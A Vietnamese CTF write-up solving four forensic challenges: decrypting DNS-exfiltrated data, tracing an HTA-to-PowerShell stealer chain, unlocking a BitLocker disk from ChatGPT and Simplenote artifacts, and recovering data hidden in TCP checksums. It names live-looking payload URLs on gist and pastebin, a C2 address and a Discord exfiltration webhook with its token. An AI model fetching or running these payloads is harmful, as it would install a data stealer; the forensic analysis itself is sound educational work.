---
title: "Writeup CSCV2025 Quals"
description: "Writeup for Forensic Challenge"
summary: "Writeup for Forensic Challenge"
categories: ["Writeup"]
tags: ["Forensic", "Reverse", "Writeup"]
#externalUrl: ""
date: 2025-10-18
draft: false
authors:
  - ducnocrypt
cover: /images/post_covers/cscv2025.jpg
---


## DNS Exifil
![image](https://hackmd.io/_uploads/r1Hw3J_SWx.png)


**Phân tích**

Trước hết ta phân tích access log thấy IP 192.168.13.37 có hành động khá là lạ:

- Gửi request **POST /admin/login** mỗi 30 giây nhưng đều sai mật khẩu
- Đến 09:19:52 đăng nhập thành công vào admin
- Upload **POST /admin/upload-media.php**
- **GET /media/image1.php** rồi sau đó chạy các lệnh để xem thông tin **GET /media/image1.php?c=id, GET /media/image1.php?c=whoami,…**
- Cuối cùng cố đọc các file **/flag, .env**

Vậy là hacker đã có được shell, tiếp theo ta sẽ phân tích error log để xem hacker đã lấy được những gì từ server

Sau khi tải **getfile.php** lên, attacker gọi **GET /media/getfile.php?debug=true**. Trong quá trình debug, ứng dụng log APP_SECRET và cách lấy key/iv AES:  
**DEBUG VARS: APP_SECRET=F0r3ns1c-2025-CSCV và H=SHA256(APP_SECRET); AES_KEY=H\[0.15\]; AES_IV=H\[16.31\]**

- _Key: 5769179ccdf950443501d9978f52ddb5_
- _IV: 1b70ca0d4f607a976c6639914af7c7a6_

![image](https://hackmd.io/_uploads/rkeO3JdHbe.png)



Cuối cùng hacker exfiltrate dữ liệu bằng cách AES encrypt rồi gửi từng đoạn nhỏ qua các query DNS hex.cloudflar3.com

Biết vậy rồi thì ta chỉ cần lấy chúng ra từ file PCAP sử dụng tshark

**tshark -r 10.10.0.53_ns_capture.pcap -T fields -e dns.qry.name | uniq | grep hex**

```
p.c7aec5d0d81ba8748acac6931e5add6c24b635181443d0b9d2.hex.cloudflar3.com
p.f8aad90d5fc7774c1e7ee451e755831cd02bfaac3204aed8a4.hex.cloudflar3.com
p.3dfec8a22cde4db4463db2c35742062a415441f526daecb59b.hex.cloudflar3.com
p.f6af1ecb8cc9827a259401e850e5e07fdc3c1137f1.hex.cloudflar3.com
f.6837abc6655c12c454abe0ca85a596e98473172829581235dd.hex.cloudflar3.com
f.95380b06bf6dd06b89118b0003ea044700a5f2c4c106c3.hex.cloudflar3.com
```

![image](https://hackmd.io/_uploads/Hk9u2JdHbe.png)



solution.py
```python
import hashlib
import re
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
# Key và IV
app_secret = "F0r3ns1c-2025-CSCV"
h = hashlib.sha256(app_secret.encode()).hexdigest()
key = bytes.fromhex(h[0:32])
iv = bytes.fromhex(h[32:64])
print(f"[+] AES Key: {key.hex()}")
print(f"[+] AES IV: {iv.hex()}")
# Đọc DNS queries và deduplicate
dns_data = []
seen_chunks = set()
try:
    with open('dns_exfil.txt', 'r') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue          
            parts = line.split('\t')
            dns_name = parts[-1] if parts else line
            match = re.search(r'^([pf])\.([a-f0-9]+)\.hex\.cloudflar3\.com', dns_name)
            if match:
                prefix = match.group(1)
                hex_chunk = match.group(2)
                unique_key = f"{prefix}:{hex_chunk}"
                if unique_key not in seen_chunks:
                    seen_chunks.add(unique_key)
                    timestamp = parts[0] if len(parts) > 1 else ''
                    dns_data.append((timestamp, prefix, hex_chunk))
except FileNotFoundError:
    print("[!] File dns_exfil.txt not found!")
    exit(1)
print(f"\n[+] Total unique DNS queries: {len(dns_data)}")
dns_data.sort()
prefix_data = {}
for timestamp, prefix, hex_chunk in dns_data:
    if prefix not in prefix_data:
        prefix_data[prefix] = []
    prefix_data[prefix].append(hex_chunk)
print(f"[+] Found prefixes: {list(prefix_data.keys())}")
for prefix in sorted(prefix_data.keys()):
    chunks = prefix_data[prefix]
    hex_data = ''.join(chunks)
    print(f"\n[+] Prefix '{prefix}': {len(chunks)} chunks, {len(hex_data)} hex chars")
    print(f"[+] Hex data: {hex_data}")
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ciphertext = bytes.fromhex(hex_data)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        print(f"\n[+] Decrypted data (prefix '{prefix}'):")
        print("="*60)
        decoded = plaintext.decode('utf-8', errors='ignore')
        print(decoded)
        print("="*60)
        # Tìm flag
        flag_match = re.search(r'CSCV\{[^}]+\}', decoded)
        if flag_match:
            print(f"\n🚩 FLAG FOUND: {flag_match.group(0)}")
    except Exception as e:
        print(f"[!] Decryption error: {e}")
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            ciphertext = bytes.fromhex(hex_data)
            plaintext = cipher.decrypt(ciphertext)
            print(f"\n[+] Raw decrypted (no unpad):")
            print(plaintext)
            decoded = plaintext.decode('utf-8', errors='ignore')
            print(decoded)
            flag_match = re.search(r'CSCV\{[^}]+\}', decoded)
            if flag_match:
                print(f"\n🚩 FLAG FOUND: {flag_match.group(0)}")
        except Exception as e2:
            print(f"[!] Still failed: {e2}")

```
![image](https://hackmd.io/_uploads/rkhK3JurZg.png)


> CSCV2025{DnS_Exf1ltr4ti0nnnnnnnnnnNN!!}

## NostalgiaS

![image](https://hackmd.io/_uploads/SyS9nkuHbe.png)



Đề bài có nhắc đến việc dữ liệu đã bị exfiltrated cho nên có thể đoán rằng người dùng đã tải hoặc chạy mã độc trên máy, kiểm tra các thư mục của người dùng **kadoyat**

Kiểm tra thư mục **Documents** thấy có thêm 1 vài file
![image](https://hackmd.io/_uploads/SkCi3y_rZg.png)



Các file zip đều có mật khẩu, thử crack thì biết được là **secret**, giải nén ra 3 file xlsm bình thường, không có gì lạ. Các thư mục khác Desktop, Downloads, ... cũng vậy nên sẽ chuyển sang xem lịch sử duyệt web của người dùng

Kiểm tra trong thư mục AppData có thể thấy người dùng sử dụng 3 trình duyệt là Chrome, Edge và Internet Explorer. Kiểm tra Chrome và Edge trước thì vẫn không có gì đặc biệt, nhưng khi kiểm tra Internet Explorer trong **AppData/Local/Microsoft/Windows/WebCache/WebCacheV01.dat**
![image](https://hackmd.io/_uploads/SJL2nk_B-g.png)




Để phân tích ta có thể dùng [IE10Analyzer](https://github.com/moaistory/IE10Analyzer) với tuỳ chọn là Carving records để lấy được nhiều data nhất có thể. Trong bảng **iedownload** thấy người dùng tải một file **FlashInstaller.hta**
![image](https://hackmd.io/_uploads/Byv621drZx.png)



Sau một lúc tìm kiếm trong bảng **Contents** ta thấy có truy cập một đường link lạ trên github
![image](https://hackmd.io/_uploads/r1Z02kuHWl.png)



**https://gist.githubusercontent.com/oumazio/ad5626973af6118062ae401c1e788464/raw/725302cda73d10e260e2ed0f26d935e576d3bc1c/FlashInstaller.hta_**

Thử curl về và phân tích
![image](https://hackmd.io/_uploads/Hk3AnkuH-x.png)



Khi kiểm tra các phần tag thì thấy các tag **&lt;script&gt;** có nhiều hành động lạ không như một file FlashInstaller bình thường
![image](https://hackmd.io/_uploads/r1DkT1dHZg.png)



Tải và thực hiện một file javascript từ github
![image](https://hackmd.io/_uploads/S1yeTJ_SWl.png)



Vậy có thể nói rằng người dùng đã có thể bị lừa tải file **FlashInstaller.hta** nghĩ rằng đây là một installer bình thường từ đó bị dính mã độc, mất trộm dữ liệu

**_https://gist.githubusercontent.com/oumazio/d2b2cbbe1ad51fd956815e78e6bfe31d/raw/2e34af3f8aac3392f07a1d59013cc8897dda8f3a/something.txt_**

File **something.txt** là một file javascript đã bị **obfuscated**, để deobf ta có thể lên [obf-io.deobfuscate.io](https://obf-io.deobfuscate.io/)
![image](https://hackmd.io/_uploads/BJsx6kurWl.png)



Sau khi deobf có thể thấy đây là một file dùng để giao tiếp với server C2: **192.168.11.1:3000**
![image](https://hackmd.io/_uploads/r1zbp1OSbe.png)



**initializeRegistry():** Kiểm tra xem **HKCU\\\\SOFTWARE\\\\hensh1n** có tồn tại hay không, nếu không thì sẽ thêm vào khoá hensh1n một giá trị 8 kí tự ngẫu nhiên
![image](https://hackmd.io/_uploads/H1kGpkdr-l.png)


Biết được người dùng là **kadoyat** ta có thể xuất file **NTUSERDAT** cùng tên
![image](https://hackmd.io/_uploads/H1dUa1uBbe.png)



Và kiểm tra **HKCU\\\\SOFTWARE\\\\hensh1n** biết được 8 kí tự đó là **HxrYJgdu**

**_(ghi nhớ 8 ký tự này)_**
![image](https://hackmd.io/_uploads/HyHDaJuH-x.png)



Tiếp tục phân tích hàm **sendToServer**: Gửi dữ liệu lên server C2 **http://192.168.11.1:3000**
![image](https://hackmd.io/_uploads/HypPTy_SWl.png)



Hàm **checkIn()**: Tạo một **taskID**, lấy thông tin hệ điều hành của người dùng rồi gửi đến C2 qua uri **/api/agent/checkin**
![image](https://hackmd.io/_uploads/B1rdp1uHbg.png)



Nếu 2 bước **initializeRegistry()** và **checkIn()** thành công thì sẽ chờ C2 gửi lệnh rồi thực hiện nó qua hàm **processCommand()**

Sau khi thực hiện xong thì sleep 5 giây, gửi đến uri **/api/agent/poll** với JSON **{'taskId': &lt;GUID&gt;, 'hostname': &lt;name&gt;},** tiếp tục chờ lệnh từ C2 rồi lặp lại

\+ Chạy payload powershell từ file secr3t.txt

\+ Thu thập thông tin chi tiết của máy

\+ Tự huỷ

\+ Xoá windows evtx và lịch sử powershell
![image](https://hackmd.io/_uploads/ByRuTJuBbe.png)



Bây giờ ta sẽ chuyển qua phân tích **secr3t.txt**
![image](https://hackmd.io/_uploads/BJNYpyuBWg.png)



File này sẽ decode một chuỗi Base64 sau đó deompress, ta sẽ lên Cyberchef để [decode](https://gchq.github.io/CyberChef/#recipe=From_Base64%28'A-Za-z0-9%2B/%3D',true,false%29Raw_Inflate%280,0,'',false,false%29&input=aFZOaGI5b3dFUDJPeEgrd1VDU0NJSVpPMDZReTdRTnQxYTFyeHlaZzZ5YkVKaWM1aUZmSHpoeFRpTHIrOTUzQmxLU2dOVitpM04xNzc5N2x6aHZrT2FTaEtMNXFRZDZSUm1KTWx2ZTczWXpsQmtJdWFhVFNybWFyN21udkQvd1lmeGcwNmpYdnU5TFhVR0I1Yi8zcU5YNVBpZ3lHTEFWTE1EYkFCT2lQVERLT1lBMTB4R1BRMXp5NnM5QlBZQklWNzRwSFM0bkJlczNvZ2p6VWF3UWY3eGJDYzhGQkdpd1l3aXI0SFA2R3lKQnhnUTJsZEFpR1BsVTRCTWhJeFJDZksybTJzRDBIdlZBcktSU0x4MFp6dWZDOWt0M1djMEY2d2ZOTTVlQzdqTXNuc1A3R3hCSnl5MXpWb2hQTlU3OUZnandUM0pCbXAwbitrdHNFTk96YWZpRGVMeEtrekVRSmFmN3NyYWU5NEhRUVhMSmdQbXQ3VGZKWVVYTGtaNFhaaUpYY2h4aWF6a3E5MEJ1UUM1TnNnWE9saWU5eCswUGVFbndId2h5VzJreTczZHJOK1VCdzZ2RVpNa3pSMmoxb00rdjNKOG9tL0QyVExYR1dPK1RralJ0VDFZUFNmTUVsRS84eFVWWjkyY2VSNm1OV0tyck95NkcvSUZ5amhsdmdZKzB6dHg5MkVtN2xSakFYMkQ1WGt1NjJCNGR6ZzB2bFYxVXJhOFBuYU9YcE1BSUpwTkVnQVpNeEtkL0FObDUxWXBoZWdMRlFhMkhYRUgyL2plMUpXeVZNdXFHOGtuTmxNWHNHaTlySytTWFp6akZ2WjF6R2VDS1hnaTF5OURjMnpQQUlCNGJ6ZXJuNnl6SVVQRHJlRWIyUzkrb09HNWRMSVRwazgzcStPbzhrMnB5SW13T3M4WnBPTVB3UA&oeol=CRLF)
![image](https://hackmd.io/_uploads/BkRYp1drZe.png)



Tải chuỗi hex từ Pastebin -> ghép vào -> XOR với **0x24** -> load assembly vào RAM **(\[System.Reflection.Assembly\]::Load)** → gọi **StealerJanai.core.RiderKick.Run()**

Vậy ta sẽ tiếp tục decode payload từ **pastebin** ra một file **dll** có tên là **StealerJanai** được viết bằng C#

Từ url [pastebin](https://pastebin.com/raw/90qeYSHA) ở cyberchef, trích xuất ra thành 1 file txt
![image](https://hackmd.io/_uploads/S1sqTyurbe.png)


Sau đó viết 1 script powershell đọc file **90qeYSHA.txt**, parse các giá trị hex, XOR từng byte với **0x24**, rồi ghi kết quả ra **StealerJanai.dll**

**Script powershell**
```shell
param(
    [string]$InputPath  = ".\90qeYSHA.txt",
    [string]$OutputPath = ".\StealerJanai.dll",
    [byte]$XorKey       = 0x24
)
# Đọc toàn bộ nội dung
$raw = Get-Content -Raw -Path $InputPath
# Tìm tất cả các giá trị 0xHH (hex)
$matches = [System.Text.RegularExpressions.Regex]::Matches($raw, '0x([0-9A-Fa-f]{1,2})')
if ($matches.Count -eq 0) {
    Write-Error "Không tìm thấy byte hex nào trong $InputPath"
    exit 1
}
$bytes = New-Object System.Collections.Generic.List[byte]
foreach ($m in $matches) {
    $h = $m.Groups[1].Value
    try {
        $b = [Convert]::ToByte($h, 16)
        $bytes.Add($b)
    } catch {
        Write-Warning "Bỏ qua hex không hợp lệ: $h"
    }
}
# XOR từng byte với khóa
$out = New-Object byte[] ($bytes.Count)
for ($i = 0; $i -lt $bytes.Count; $i++) {
    $out[$i] = $bytes[$i] -bxor $XorKey
}
[System.IO.File]::WriteAllBytes($OutputPath, $out)
Write-Host "Done. Đã tạo: $OutputPath (bytes: $($out.Length))"

```

![image](https://hackmd.io/_uploads/BknjaJuSWl.png)



Sau đó load vào [dnSpy](https://github.com/dnSpy/dnSpy/releases) . Tìm tới hàm **RiderKick**

Đây là một mã độc stealer, lấy cắp các thông tin về máy tính, trình duyệt của người dùng và gửi đến 1 discord webhook **https://discord.com/api/webhooks/1389141710126452766/D1NUx0HaXI0Zx6xJSEqYy06X7b8HisqM3rfNUw2qdIWt_WbcE8HXLcIpe2oicB7GpU6e** có tên là **tung tung tung sahur** (_Sau giải thì webhook không còn hoạt động nữa, nhưng cũng không quan trọng vì flag không nằm trong đây_)
![image](https://hackmd.io/_uploads/S1OhpkdrZg.png)



Tiếp tục phân tích các class **BrowserDataCollector**, **DiscordWebhookSender**, **SystemInformation**

Sau một hồi phân tích các class và hàm nhỏ thì thấy trong **SystemInformation** có gọi 1 class nữa là **SystemSecretInformationCollector** (Thực ra thấy có chữ secret nên ấn vào) đang dựng một chuỗi như là flag
![image](https://hackmd.io/_uploads/Hy7aTyuHWe.png)



Hàm **DecodeMagicToString()** chính là một hàm **decode Base62** với bảng chữ cái **0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz**

Hàm **Collect()** sẽ dựng một **chuỗi text + machinename + text2 + registryvalue + }** với **text** và **text2** được decode bằng **hàm DecodeMagicToString()** . Ở cuối chuỗi có **}** nên khả năng cao có thể là flag
![image](https://hackmd.io/_uploads/ryTapyuSWe.png)



Giải mã chuỗi base62, ta được
![image](https://hackmd.io/_uploads/ByLR61Or-x.png)

![image](https://hackmd.io/_uploads/B1f1Ay_Bbe.png)



Tiếp theo tới part2 của flag:

**machinename** là tên máy tính của người dùng. Ta có thể lấy dữ liệu này từ file **SYSTEM** trong **Windows/System32/config**
![image](https://hackmd.io/_uploads/By1gRyOS-x.png)



rồi load vào trong **RegistryExplorer**, tên máy sẽ nằm ở key **ROOT\\ControlSet001\\Control\\ComputerName\\ComputerName: DESKTOP-47ICHL6**
![image](https://hackmd.io/_uploads/SJ8lRk_BZl.png)



Vậy part2 của flag: **DESKTOP-47ICHL6**

Phần 3 của flag là registryvalue được lấy từ giá trị của key SOFTWARE\\\\hensh1n, lúc đầu khi kiểm tra ta đã biết nó là **HxrYJgdu**

> CSCV2025{your_computer_DESKTOP-47ICHL6_has_be3n_kicked_byHxrYJgdu}

*Cảm ơn author đã cho 1 challenge khá hay:>*

## Case AlphaS
![image](https://hackmd.io/_uploads/S1XbAydBZg.png)




**Phân tích**

_Nội dung file pdf:_
![image](https://hackmd.io/_uploads/BkKb0yuBbg.png)



Vậy mục tiêu của bài này là tìm được cách để decrypt hoặc mở khoá file **vhdx** bị bitlocker encrypted

Trước hết tìm hiểu cần những gì để có thể mở một ổ cứng bị khoá

- Recovery Password (48 ký tự)
- Recovery Key file (.BEK)
- Full Volume Encryption Key (FVEK) / Volume Encryption Key (VMK)

Ở đây FVEK và VMK là không thể lấy được bởi vì bài không cho ta memory dump vào lúc ổ cứng đang được mở khoá nên ta sẽ không thể xuất chúng ra. Vậy chỉ còn file Recovery Key file hoặc là mật khẩu

Trước hết thì xác định được thư mục người dùng là **windows**, đã thử phân tích file MFT để xem người dùng có giấu key file hay là txt,… chứa mật khẩu không nhưng không tìm được gì nhiều

Load file vào FTK, Để ý thấy trong thư mục **Downloads** có tải một số ứng dụng
![image](https://hackmd.io/_uploads/B1HXzRkdB-l.png)



ChatGPT và SimpleNote là Windows Store Apps, thử xuất 2 file installer ra và chạy sẽ thấy mở Windows Store lên, dữ liệu của Windows Store Apps sẽ được lưu trong **AppData/Packages/&lt;name&gt;**

Người dùng đã tải ChatGPT, SimpleNote, Firefox. Rất có thể người dùng đã chat, note lại hoặc tìm kiếm gì đó trong đó có ghi key hoặc nội dung file **BEK** vào cho nên ta sẽ kiểm tra lịch sử, logs của 3 ứng dụng này

Firefox người dùng chỉ tìm kiếm tải ChatGPT và SimpleNote, không thấy điền thông tin đăng nhập hay gì cả, không có gì đặc biệt liên quan đến key hay mật khẩu

Tiếp theo là SimpleNote, note được lưu trong **AppData\\Packages\\22490Automattic.Simplenote_9h07f78gwnchp\\LocalCache\\Roaming\\Simplenote\\IndexedDB\\file_\_0.indexeddb.leveldb\\000003.log**

Thử strings ra ta sẽ có chuỗi sau

```
content"Ozip password: 5525b8d2d8534b716467493f3660b11e1c44b22cd0c97275619b94a0e5c82fda"
```
![image](https://hackmd.io/_uploads/BkpGAJuSWl.png)



_Đây chưa phải là mật khẩu của ổ cứng mà là mật khẩu của file zip nào đó, tạm thời bây giờ chưa dùng đến nhưng cứ lưu lại_

Cuối cùng là ChatGPT, tương tự như SimpleNote và các ứng dụng trong Windows Store khác, các cuộc trò chuyện của người dùng cũng được lưu tại **AppData\\Packages\\OpenAI.ChatGPT-Desktop_2p2nqsd0c76g0\\LocalCache\\Roaming\\ChatGPT\\IndexedDB\\https_chatgpt.com_0.indexeddb.leveldb\\000003.log**
![image](https://hackmd.io/_uploads/rJ9XAyuHbe.png)



Sau khi strings và tìm một hồi thấy người dùng đã hỏi câu sau:
![image](https://hackmd.io/_uploads/BJfNCy_H-g.png)



Vậy là đã có recovery key rồi: **028853-431640-166364-032076-217943-045837-542388-281017**, chọn Enter recovery key và mở khoá ổ cứng với key này

Ở trong có một file secret.zip, thử mở khoá với mật khẩu zip trong SimpleNote sẽ thành công **5525b8d2d8534b716467493f3660b11e1c44b22cd0c97275619b94a0e5c82fda**

Giải nén ra sẽ có một số file dữ liệu mật của công ty mà người dùng đang định bán và **ssh.txt** với nội dung
![image](https://hackmd.io/_uploads/BkeBRkOBZx.png)



**cff4c6f0b68c31cb** chính là mật khẩu của [pastebin](https://pastebin.com/WciYiDEs)
![image](https://hackmd.io/_uploads/B1yUAy_HWe.png)




> CSCV2025{h3Y_Th!s_|5_jUs7_tH3_bE9IN|\\|iNg_dc8fb5bdedd10877}**


## CovertS
![image](https://hackmd.io/_uploads/BylP0Jdr-l.png)



**Phân tích**

Tổng hợp các giao thức được ghi lại trong file pcap

PCAP rất lớn và rất nhiều IP khác nhau

Như mô tả thì người dùng đã bị exfiltrate cái gì đó qua máy của người khác. Trước hết ta sẽ cần xác định được IP của người dùng. Khá may trong pcap có lưu lại NTP
![image](https://hackmd.io/_uploads/SkdDCJ_Sbx.png)



Các gói tin client xuất phát từ IP 192.168.203.91 => Đây là IP của người dùng
![image](https://hackmd.io/_uploads/SkAPAydB-l.png)



Khi exfiltrate, để giảm khả năng bị phát hiện thì ta sẽ thường phải chia nhỏ file, dữ liệu ra cho nên sẽ cần rất nhiều packet. Từ đó ta loại bỏ được một số giao thức như NTP, ARP, HTTP, UDP

TIếp theo sẽ thử phân tích ICMP do giao thức này được sử dụng khá phổ biến khi thực hiện data exfiltration, các packet ICMP trong file được thực hiện giữa 192.168.203.91 và 42.96.60.40

Sau một hồi kiểm tra thì lại không thấy có gì đặc biệt và dấu hiệu nào đáng ngờ cả. Về phần data của các packet thì chỉ là toàn bộ 512 kí tự A

Thử tiếp về thời gian giữa các packet. Không có sự lặp lại, các khoảng thời gian giữa 2 packet đều là ngẫu nhiên cũng không có gì lạ

Các trường khác thì không cho ra các đoạn dữ liệu consistent (Không dịch từ hex ra một kí tự ASCII đọc được). Có thể đã bị mã hoá nhưng tìm các tool trên mạng về ICMP exfiltration không có cái nào sử dụng key hay các loại mã hoá phổ biến, nếu mà là một loại custom do tác giả tạo thì cũng sẽ phải tìm được trong PCAP cũng như không có hint về key (HTTP chỉ có tải một số file từ server của ubuntu, các giao thức như QUIC hay TLS không tìm thấy và cũng không được cho đủ dữ kiện để giải mã)

Không tìm được pattern nào hợp lí cả cho nên ta sẽ skip

Khi chuyển sang phân tích các packet TCP và UDP, ta sẽ sử dụng **Statistics/Conversations** trong wireshark để tiện phân tích

Hầu hết đều giao tiếp qua HTTP và HTTPS (port 80, 443) nhưng sau đó có một đoạn rất lạ, khác hẳn so với những packet trước đó
![image](https://hackmd.io/_uploads/S1vdRydS-x.png)



Từ đoạn **192.168.192.1:3239**, từ IP của người dùng nhưng với rất nhiều port khác nhau, nhưng mỗi port đều gửi đến chung một địa chỉ và chỉ có đúng 1 packet. Rất đáng nghi cho nên ta sẽ filter **ip.src == 192.168.203.91 && ip.dst == 192.168.192.1 && tcp.dstport == 3239** và xuất ra để phân tích cho nhẹ (Chỉ có 608 packet)
![image](https://hackmd.io/_uploads/r1ftRJdBWg.png)



Đặt tên bất kỳ rồi ấn save
![image](https://hackmd.io/_uploads/r1PtAydrWe.png)



Kiểm tra các packet lại thấy một điều lạ hơn nữa lạ hơn nữa là trường Identification (ip.id) của gói IP và checksum (tcp.checksum)của TCP đều giống nhau trong toàn bộ 608 packet. Điều này là rất khó bởi vì ip.id và tcp.checksum được tính toán khác nhau có thể 1 hoặc 2 packet trùng được nhưng đến 608 thì rất lạ

Tất cả đều có thể dịch ra các kí tự đọc được
![image](https://hackmd.io/_uploads/rJCF01_rWe.png)



Vậy có thể dữ liệu đã bị exfiltrate qua **192.168.192.1:3239**, nội dung được chia nhỏ và nằm trong trường checksum của các packet TCP(tcp.checksum) hoặc ip.id đều được

```tex
tshark -r challenge.pcapng -Y "ip.src == 192.168.203.91 && ip.dst == 192.168.192.1 && tcp.dstport == 3239" -T fields -e tcp.checksum > out.txt
```
![image](https://hackmd.io/_uploads/SkTq01_BZg.png)



Tới đây chỉ việc decode hex rồi decode Base64 sẽ ra dữ liệu bị exfiltrated

solution.py
```python
import base64
filename = 'out.txt'
try:
    with open(filename, 'r') as f:
        lines = f.readlines()
    full_hex_string = ""
    for line in lines:
        clean_hex = line.strip().replace('0x', '')
        full_hex_string += clean_hex
    # Decode chuỗi hex thành bytes
    base64_data = bytes.fromhex(full_hex_string)
    exfiltrated_data = base64.b64decode(base64_data)
    print("Dữ liệu đã giải mã")
    print(exfiltrated_data.decode('utf-8', errors='ignore'))
    print("--------------------------")
except FileNotFoundError:
    print(f"Lỗi: Không tìm thấy file {filename}")
except Exception as e:
    print(f"Đã xảy ra lỗi: {e}")
```
![image](https://hackmd.io/_uploads/r1_j0JdS-g.png)



> CSCV2025{my_chal_got_leaked_before_the_contest_bruh_here_is_your_new_flag_b8891c4e147c452b8cc6642f10400452}
